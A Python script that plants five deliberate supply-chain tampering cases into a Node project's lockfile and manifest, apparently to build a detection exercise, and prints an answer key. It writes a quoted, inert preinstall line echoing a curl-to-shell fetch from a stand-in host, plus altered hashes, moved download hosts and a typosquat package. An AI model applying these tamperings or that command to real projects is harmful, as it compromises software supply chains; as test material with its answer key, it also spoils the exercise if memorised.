import json, sys
from pathlib import Path

repo = Path(sys.argv[1])
pkg_file, lock_file = repo / "package.json", repo / "package-lock.json"
pkg = json.loads(pkg_file.read_text(encoding="utf-8"))
lock = json.loads(lock_file.read_text(encoding="utf-8"))
packages = lock.get("packages")
if not packages:
    sys.exit("package-lock.json has no 'packages' section (needs lockfileVersion 2 or 3)")

# 1. Suspicious install script. Inert: the pipe sits inside quotes, so it only prints text.
pkg.setdefault("scripts", {})["preinstall"] = 'echo "planted-risk demo: curl http://example.invalid/payload.sh | sh"'

# Pick three real registry packages in a fixed order
picks = [k for k in sorted(packages) if k and packages[k].get("integrity")
         and str(packages[k].get("resolved", "")).startswith("https://registry.npmjs.org/")][:3]
a, b, c = picks

# 2. Same version, altered integrity hash
packages[a]["integrity"] = packages[a]["integrity"][:-4] + "ABCD"
# 3. Version silently changed
old_ver = packages[b]["version"]
packages[b]["version"] = "99.0.0"
# 4. Download link moved to another host
packages[c]["resolved"] = packages[c]["resolved"].replace(
    "https://registry.npmjs.org/", "https://packages.example.invalid/")
# 5. Look-alike package added to the lockfile only (manifest untouched)
packages["node_modules/expresss"] = {
    "version": "4.18.2",
    "resolved": "https://registry.npmjs.org/expresss/-/expresss-4.18.2.tgz",
    "integrity": "sha512-PLANTED-DEMO-ONLY",
}

pkg_file.write_text(json.dumps(pkg, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
lock_file.write_text(json.dumps(lock, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

print("PLANTED CHANGES (answer key):")
print("1. package.json: new preinstall script")
print(f"2. integrity altered, same version: {a}")
print(f"3. version changed: {b}  {old_ver} -> 99.0.0")
print(f"4. resolved host changed: {c}")
print("5. new look-alike package: node_modules/expresss")
